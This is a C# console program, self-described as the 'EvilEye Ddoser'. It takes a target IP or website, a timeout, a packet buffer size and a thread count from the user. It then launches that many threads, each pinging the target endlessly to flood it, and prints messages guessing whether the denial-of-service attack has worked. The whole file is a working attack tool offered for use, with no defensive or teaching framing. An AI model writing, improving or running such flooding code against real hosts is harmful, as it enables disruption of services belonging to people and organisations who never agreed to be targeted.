using System;

namespace EvilEye
{
    using static System.Console;
    class Program
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Welcome to EvilEYE Ddoser ... :) it's developed by Mr. Touraj Ostovari");
            WriteLine("Enter an/a IP Address/Website: ");
            string URL = ReadLine();
            WriteLine("Timeout?");
            int TimeOut = int.Parse(ReadLine());
            WriteLine("Buffer Count?");
            byte[] buffer = new byte[int.Parse(ReadLine())];
            WriteLine("Number of threads??");
            var threads = Int64.Parse(ReadLine());
            Uri ur;
            System.Net.IPAddress IP;
            if (Uri.TryCreate(URL, UriKind.RelativeOrAbsolute, out ur) == true || System.Net.IPAddress.TryParse(URL, out IP) == true)
            {
                System.Threading.Thread[] threads_ = new System.Threading.Thread[threads];
                for (int i = 0; i < threads; i++)
                {
                    threads_[i] = new System.Threading.Thread(() =>
                    {

                        while (true)
                        {
                            try
                            {
                                System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
                                System.Net.NetworkInformation.PingReply pingReply = ping.Send(URL, TimeOut, buffer, null);
                                if (pingReply.Status == System.Net.NetworkInformation.IPStatus.Success)
                                {
                                    ForegroundColor = ConsoleColor.Yellow;
                                    WriteLine("\tSTILL ADDRESS IS ALIVE -_-");
                                }
                                else if (pingReply.Status == System.Net.NetworkInformation.IPStatus.TimedOut)
                                {
                                    ForegroundColor = ConsoleColor.Green;
                                    WriteLine("\tMAYBE DDOSER WORKED!! >> TIMEOUT <<");
                                }
                                else
                                {
                                    ForegroundColor = ConsoleColor.Blue;

                                    WriteLine("Something went wrong ... maybe bad address happened ...");
                                }
                            }
                            catch (Exception ex)
                            {
                                ForegroundColor = ConsoleColor.Blue;
                                WriteLine("Something went wrong OR target has Anti-Ddos Guard ...");
                            }
                        }
                    });
                    threads_[i].Start();
                }

            }
            else
            {
                WriteLine("Please enter a valid website/IP address");
            }
            WriteLine("Done!!!");
        }
    }
}
